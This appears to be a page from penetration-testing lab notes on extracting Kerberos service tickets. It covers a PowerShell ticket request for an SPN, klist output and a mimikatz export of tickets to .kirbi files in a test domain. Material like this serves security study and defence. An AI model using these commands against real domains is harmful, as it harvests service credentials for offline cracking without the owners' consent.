# Service Accounts

With Kerberos the user must request a Service Ticket generated by the Domain Controller in order to access a services resource hosted under a Service Principal Name (SPN). Only the Service checks for user access permissions when user access is requested, after the DC has already issued the Service Ticket to the user. As the ticket is owned by the user, it can be extracted from local memory and saved to disk for later use.

### Using Powershell to display tickets for a service

```
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SQLService'This should generate us a ticket for the service requested
```

```
Id                   : uuid-d561e63d-42e1-4a24-85e7-ad8c5a82c957-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 27/04/2022 12:29:01 AM
ValidTo              : 27/04/2022 10:26:26 AM
ServicePrincipalName : SQLService
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

### Powershells klist will display our cached tickets

```
PS C:\> klist
...
Cached Tickets: (3)

#0>     Client: pfry @ FUTURAMA.LOCAL
        Server: krbtgt/FUTURAMA.LOCAL @ FUTURAMA.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/27/2022 8:25:08 (local)
        End Time:   4/27/2022 18:25:08 (local)
        Renew Time: 5/4/2022 8:25:08 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: BENDER

#1>     Client: pfry @ FUTURAMA.LOCAL
        Server: SQLService @ FUTURAMA.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/27/2022 8:31:53 (local)
        End Time:   4/27/2022 18:25:08 (local)
        Renew Time: 5/4/2022 8:25:08 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: Bender.FUTURAMA.local
```

{% hint style="info" %}
With mimikatz use: kerberos::list
{% endhint %}

### Using mimikatz to export tickets

```
mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 27/04/2022 8:25:08 AM ; 27/04/2022 6:25:08 PM ; 4/05/2022 8:25:08 AM
   Server Name       : krbtgt/FUTURAMA.LOCAL @ FUTURAMA.LOCAL
   Client Name       : pfry @ FUTURAMA.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
   * Saved to file     : 0-40e10000-pfry@krbtgt~FUTURAMA.LOCAL-FUTURAMA.LOCAL.kirbi

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 27/04/2022 8:31:53 AM ; 27/04/2022 6:25:08 PM ; 4/05/2022 8:25:08 AM
   Server Name       : SQLService @ FUTURAMA.LOCAL
   Client Name       : pfry @ FUTURAMA.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-pfry@SQLService-FUTURAMA.LOCAL.kirbi
```
